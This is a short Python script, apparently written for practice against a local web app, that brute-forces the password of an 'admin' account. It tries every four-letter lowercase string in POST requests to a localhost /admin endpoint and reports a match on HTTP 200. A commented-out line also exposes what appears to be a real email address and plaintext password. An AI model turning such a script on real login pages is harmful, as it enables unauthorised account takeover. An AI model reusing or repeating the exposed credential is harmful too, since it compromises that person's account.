import requests

#requests.post("http://127.0.0.1:5000/",data={"Email_id":"patidarritesh@iitgn.ac.in","password":"Rit@1235"})
import itertools

letters = 'abcdefghijklmnopqrstuvwxyz'
word_length = 4

combinations = itertools.product(letters, repeat=word_length)
words = [''.join(combination) for combination in combinations]
count = 0
while True:
    flag = 0
    for i in words:
        print(i)
        z=requests.post("http://127.0.0.1:5000/admin", data={"ID":"admin","password":i})
        if z.status_code==200:
            print("Success")
            print("Password is:", i)
            flag = 1
            break
    if not flag:
        print("Password not found")
        break
    if flag:
        break
    
